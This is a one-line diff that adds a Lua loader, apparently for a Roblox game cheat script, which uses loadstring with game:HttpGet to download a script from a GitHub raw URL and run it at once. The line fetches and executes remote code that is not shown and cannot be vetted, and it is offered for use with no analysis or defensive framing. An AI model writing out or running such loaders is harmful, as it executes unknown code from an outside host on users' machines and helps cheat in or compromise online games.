@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/anime-zero-solar-radiance-spam0-d53amoh8fyfcle.lua"))()
